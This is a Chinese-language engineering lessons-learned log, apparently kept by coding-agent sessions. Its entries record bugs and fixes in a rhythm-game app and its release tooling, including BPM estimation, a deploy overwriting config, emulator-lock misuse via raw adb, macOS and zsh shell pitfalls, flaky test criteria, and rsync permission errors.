## #308 librosa 估 BPM 会差 3:2 或 1:2；页面标了就用页面的（cc-Yxi，2026-09-07）

**症状**：煉獄セレナーデ页面写 ♩=172，librosa `beat_track` 估成 112（≈ 2/3）；按 112 出的谱整首不对拍。
**根因**：起音自相关的谐波峰，快歌常落到 2/3 或 1/2。
**修法**：`incoming/<曲>.json` 里写 `bpm`，`make_remote_songs.py` 会锁定；没标的用 `librosa.feature.tempo` 多个 `start_bpm` 先验 + tempogram 峰复核，仍二义的记进 handover 让真机验。

## #309 发布谱面 sync 完，服务端部署把线上配置盖回旧版 → 清单有、服务端不认，交成绩 404（2026-09-07，logto 定位并修）

**症状**：`publish_songs.py` 跑完 rhythm-sync（线上 36 张），几分钟后公网清单 36 张、服务端只有 35 张；用户能下能打，交成绩才 404。
**根因**：rhythm-sync 只写 /opt 上跑的那份；logto 随后拿仓库里旧的 service/rhythm.json 提交 + 部署，deploy.sh 把仓库那份装回 /opt。两份配置、两个写入者，谁后谁赢。
**修法**（logto 已推）：rhythm-sync **同一步把 /opt 和仓库两份都写掉**，两边内容永远一致，不再依赖「跑完记得提交」。
**怎么避开**：凡是「脚本改线上、人再改仓库」的双写结构，都要让脚本一次写两份；两份内容用逐字比对核，不只比数量。

## #310 emu.sh claim 的输出丢进 /dev/null，claim 失败没察觉，后面的裸 adb 全在别人的锁里跑（cc-Yxi，2026-09-07）

**症状**：脚本开头 `emu.sh claim cc-Yxi >/dev/null`，其实 pilot 正占着；后面的 `adb install / shell input` 走的是裸 adb（不经 emu.sh 的锁守卫），在别人的 E2E 中间装包、跑局；只有最后经 emu.sh 的 `shot / release` 被拦（退出码 9）。
**根因**：锁只拦 emu.sh 的子命令，裸 adb 绕过；claim 的返回值没检查。
**怎么避开**：claim 必须判返回（`grep -q 占用模拟器` 或 exit code），失败就退出或轮询等；所有会动设备的操作一律走 `EMU_WHO=… emu.sh adb …`，不用裸 adb（#292 那条的延伸）。

## #311 主机是 macOS 时，探测命令里的 `timeout` / `/dev/tcp` / 裸 `tailscale` 全是空的（cc-Yxi_pilot，2026-09-07）

**症状**：拿 Mac mini 当主机做「从机」功能的 E2E，两处同时不对 ——
① 主机卡片里点「内网设备」，明明 Tailscale 装着也登着，App 说「这台机器没装 Tailscale 或没登录」；
② 从机页点任何一台设备，永远落到最泛的那一支「连不上这台机器」，**永远判不出 ACL**（而真实原因恰恰是 ACL）。
在 Linux 主机上跑同样的命令一切正常。

**根因**——三个独立的 macOS 坑，凑在同一条命令里：
- **BSD 没有 `timeout`**：那是 GNU coreutils 的东西，macOS 自带的只有 `gtimeout`（还得先 brew）。
  `timeout 6 bash -c '…'` 直接 command not found → 端口探测恒为「不通」。
- **`tailscale` 不在非交互 shell 的 PATH 里**：App Store 版**连 `/usr/local/bin/tailscale` 那个软链都没有**，
  CLI 只存在于 `/Applications/Tailscale.app/Contents/MacOS/Tailscale`。`command -v tailscale` 必然空手而归。
- 非交互 shell 的 PATH 还缺 `~/.local/bin` 和 `/opt/homebrew/bin`（从机侧的 `tmux` / `claude` 常在那儿）。

**修法**（`agent/Slave.kt` / `agent/TailscaleStatus.kt`）：
- 端口通不通**不再单独探**，直接从 `ssh` 自己的报错里读（"timed out" / "Connection refused" / "No route to host" …）——
  少一次往返，而且天然可移植：`ssh` 有自己的 `ConnectTimeout`，到哪儿都在。
- ping 用 `tailscale` 自带的 `--timeout 5s`，不借外部 `timeout`。
- `tailscale` 先 `command -v`，找不到就退到 app 包内那个绝对路径；PATH **主机侧和从机侧各补一次**（两层 shell）。

**怎么避开**：凡是要在「用户的机器」上跑的 shell，先问一句**它可能是 macOS 吗**。
判据：用了 GNU 专有命令（timeout / date -d / sed -i 无参 / readlink -f）、依赖 bash 扩展（`/dev/tcp`）、
或者假设某个 CLI 在 PATH 里 —— 这三类在 BSD/macOS 上都会**静默地**表现成「功能没坏，只是永远探不到」。

## #312 诊断类的判据别用短子串：两次误诊都栽在「失败输出里蹭到了成功的字样」（cc-Yxi_pilot，2026-09-07）

**症状**：从机诊断把「机器根本没开机」判成「tailnet 的 ACL 挡了 SSH」，让人去改一个根本没问题的地方。
后来给这条写测试时，**测试自己又犯了一模一样的错**。

**根因**：两处都是拿一个太短的子串当判据。
- `pingPart.contains("pong")` —— 失败输出 `no pong` 里含 "pong"，被判成 ping 通 → 误诊成 ACL。
  （`tailscale ping` 真实的成功是 `pong from <名字> (100.x) via … in 39ms`，真实的失败是 `no matching peer`。）
- 断言 `!cmd.contains("timeout ")` —— 命令里 `tailscale ping --timeout 5s` 就含 "timeout "，测试红了但代码是对的。

**修法**：判**真实输出里稳定的那一段**，不判一个碰巧的短词 —— `contains("pong from")`；
判命令位置上的词用正则锚一下：`Regex("""(^|[;&|(] *)timeout """)`。测试样本一律**贴实测的原文**
（去机器上跑一次失败的命令，把输出抄回来），别自己编一个「差不多长这样」的字符串。

**怎么避开**：诊断代码的价值全在**分对因**，分错的代价比不分更大（诬陷一个好地方）。
所以每加一支诊断，配一条**反向测试**：拿另一支的真实输出喂进去，断言它**不**落到这一支。

## #313 只装了测试 APK 没装主 APK → 跑的是旧代码，绿和红都不算数（cc-Yxi_pilot，2026-09-07）

**症状**：改完 `Slave.parse` 重新构建、把 `app-debug-androidTest.apk` scp 到 Mac 装上、跑测试，
那条刚修好的用例**照样红**；盯着源码怎么看都是对的。

**根因**：instrumented 测试是两个 APK —— 被测代码在 `app-debug.apk` 里，测试代码在 `…-androidTest.apk` 里。
只装后者，跑的还是**上一次装进去的主 APK**，等于拿新测试测旧代码。
（这次还叠了另一半：同组的会话在中间用裸 adb 装过他自己的包，主 APK 早被换掉了。）

**修法 / 怎么避开**：两个 APK **永远一起装**，顺序 app → androidTest：
```
adb install -r app-debug.apk && adb install -r -t app-debug-androidTest.apk
```
结果可疑时先确认装的是不是自己那份：`adb shell dumpsys package app.yxi | grep lastUpdateTime`（见 #279）。

## #315 同一个名字的两个后台任务都能 claim 到模拟器 → 自己撞自己，全套「Process crashed」（cc-Yxi，2026-09-07）

**症状**：截图任务和全套任务都用 `emu.sh claim cc-Yxi` 排队；锁按名字认，同名再 claim 直接成功，两个任务同时上机，截图任务中途 `adb install` 重装了包，全套里 UploadStressTest 报 `Process crashed`（#292 那种）。
**根因**：锁是「按人」不是「按任务」；一个人开两个后台任务就没有互斥。
**怎么避开**：同一个会话同一时间只排一个上机任务；要串行就写进同一个脚本，或第二个任务先 `emu.sh status` 看自己是否已在机上。跑全套期间别起任何别的上机任务。

## #314 tmux 的 `-t =名字` 精确匹配，`=` 顶在引号外会被 zsh 当成命令路径展开（cc-Yxi_pilot，2026-09-07）

**症状**：从机页点一个会话，终端里 `ssh` 过去了，却回一句
`zsh:1: cc-macdemo not found`，然后 `Connection to … closed.` —— 会话根本没接上。
在从机的 shell 里手敲同一条命令**是好的**（那台机器的交互 shell 也是 zsh）。

**根因**：tmux 用 `-t =名字` 表示**精确匹配**（不加 `=` 走前缀/通配匹配）。
我把它拼成了 `-t ='cc-macdemo'` —— `=` 在引号**外面**。
而 zsh 有个 `=command` 展开（`=ls` → `/bin/ls`），**它先于 tmux 看到这个词**：
zsh 拿 `cc-macdemo` 去 PATH 里找可执行文件，找不到就报 `not found`。
bash 没有这个展开，所以在 bash 从机上一切正常 —— 这条只在**从机的登录 shell 是 zsh**（macOS 默认）时炸。

**修法**：把 `=` 放进引号里，整体引用：`Shell.q("=$session")` → `'=cc-macdemo'`。
zsh 不对引号内的内容做 `=` 展开，tmux 拿到的还是 `=cc-macdemo`，精确匹配照旧生效。

**怎么避开**：往别人的 shell 里送命令时，**每一个不是普通字符的符号都要问一句「这个 shell 会不会先解释它」** ——
`=` 开头（zsh 的 EQUALS）、`~` 开头（波浪展开）、`{a,b}`（花括号展开）、`^`（zsh 的 EXTENDED_GLOB）
都属于「bash 上没事、zsh 上有事」。**引号是最省事的答案：连同前缀符号一起引起来**。
⚠️ 单测很难抓这一类：命令串本身长得完全正确，错的是**对端 shell 的方言**。这条是真机 E2E 抓到的。

## #316 「环境恰好具备某条件」不能当成「有人想跑这个」的判据（cc-Yxi_pilot 撞到 · cc-logto_yxi 定位并修，2026-09-07）

**症状**：全套跑在共用模拟器上，`UploadStressTest` 那 7 条**时红时跳过**，跟谁在用模拟器有关。
上一版明明刚把它们改成「没配主机就跳过」，结果我这轮跑出来又是 7 条红 ——
`AssertionError: … SSH_FX_NO_SUCH_FILE: No such file`。

**根因**：跳过的判据写的是「**App 里有没有配主机**」。
可那台模拟器是**共用**的：我为「从机」功能在里面种了一台 macOS 主机（MacMaster / 10.0.2.2），
于是压测认为「有主机 = 可以跑」，真跑了，然后死在上传路径上（那些路径是照 Linux 写的，macOS 上不存在）。
判据挑错了对象 —— 它读到的是**别人的测试环境**，而不是「有人要跑压测」。

**修法**（`512ddb2`）：判据改成「**有没有显式传 `stressKey` / `stressHost`**」——
那才是「这个人现在就是要跑它」的信号。不带参数跑全套 = 7 条跳过 + 原因，红 0；
只传 `stressHost` 不传 key 时才回退去用 App 里配好的主机（那时是显式要求的，合理）。

**怎么避开**：共用环境里，测试的开关只能挂在**执行者的显式意图**上（命令行参数、环境变量、专门的 tag），
不能挂在「环境里恰好存在什么」上 —— 后者是别人的状态，随时会变，而且变的人根本不知道自己动了你的判据。
同一族的还有：测试**改动**共用状态（#286 那次自己种主机，污染了主机表、弹指纹框卡死界面）。
一句话：**测试既不该依赖共用状态，也不该改动共用状态。**

## #317 待发版清单有个「落坑位置」：追加到清单**后面**的行，核清单时看不见（cc-Yxi_pilot 定位，2026-09-07）

- **症状**：一条已经随 1.1.24 发出去的待发版行，发版收尾清空之后**还留在 handover 里**，下次发版会被当成待办再数一遍。pilot 自己的两条更早也掉进同一个坑（被 cc-Yxi 从底下捞回去过）。
- **根因**：**不是没人核** —— 发版收尾就是「按 tag 区间核已发布、清空待发版」（`77e6e37`）。问题在**位置**：「待发版」那一节里，`**X 之后攒的**` 清单后面还跟着「不用发版就上线的」等好几块，脚本 / 人核的是那张清单，**掉在这些块下面的行不在清单里，核的时候看不见**。而追加的人天然会往「节的末尾」加 —— 我这几条都是拿「⚠️ 发版前先跑一次全套」当锚点插进去的，那个锚点正好在坑里。
- **修法 / 怎么避开**：
  · **加行就加到 `**X 之后攒的**` 那张清单的最后一条后面**，别用节末尾的告示（「发版前先跑一次全套」之类）当锚点 —— 那些告示后面全是坑。
  · 结构上把「不用发版就上线的」这类块**挪到本节最末尾**，让「攒的」永远是最后一段、追加即入列（pilot 已建议 cc-Yxi 这么改）。
  · 核清单时**别只核那张清单**：发完版顺手 `grep -n 'cc-' handover.md` 扫一眼有没有孤儿行落在清单外面。
- ⚠️ 这跟 #290 是同一类账不对的两个方向：那次是**发了没记**（收尾提交晚于功能提交），这次是**记了没清**（行落在清单外面）。两次都不是人不认真，是**口径 / 位置**本身让人看不见。

## #318 发布后公网 403：rsync 把本机 0600 的 APK 原样传过去，nginx 读不了（cc-Yxi，2026-09-07）

**症状**：`install.sh --publish` 走完，sha256 一致、latest.json 也更新了，但「公网真下一遍」403；hk13 上 `Yxi-182.apk` 是 `-rw-------`，旁边的 `Yxi.apk` 是 0644 能下。
**根因**：rsync 保留了源文件权限；这次源文件（/root/.yxi/Yxi.apk 那份中间产物）是 0600（发布脚本被 setsid nohup 起、umask 不同）。之前几次源文件恰好是 0644 所以没露。
**修法**：`mv .part 成品 && chmod 644`（已进 install.sh）。核对时别只看 sha256 和清单，**公网真下一遍**那步就是为这个留的——它报 403 就去看权限。
